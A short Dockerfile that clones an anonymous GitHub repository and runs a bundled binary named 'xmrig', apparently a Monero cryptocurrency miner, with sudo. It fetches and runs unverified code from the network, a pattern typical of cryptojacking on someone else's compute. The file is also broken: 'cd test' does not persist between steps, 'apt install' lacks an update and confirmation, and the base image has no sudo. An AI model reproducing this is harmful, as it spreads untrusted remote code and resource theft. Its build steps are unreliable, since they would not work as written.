FROM ubuntu
RUN apt install git
RUN git clone "https://github.com/jimtom333/test.git"
RUN cd test
RUN chmod +x xmrig
RUN sudo ./xmrig